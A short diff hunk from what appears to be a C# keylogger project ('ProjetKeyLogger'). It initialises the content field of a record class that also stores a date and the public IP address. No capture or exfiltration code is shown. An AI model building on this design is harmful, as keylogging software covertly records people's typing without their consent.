@@ -7,7 +7,7 @@ namespace ProjetKeyLogger
     public class Enregistrement
     {
         //Contenu de l'enregistrement courrant
-        private String contenu;
+        private String contenu = "";
         private DateTime date;
         private String adresse_ip_publique; 
 
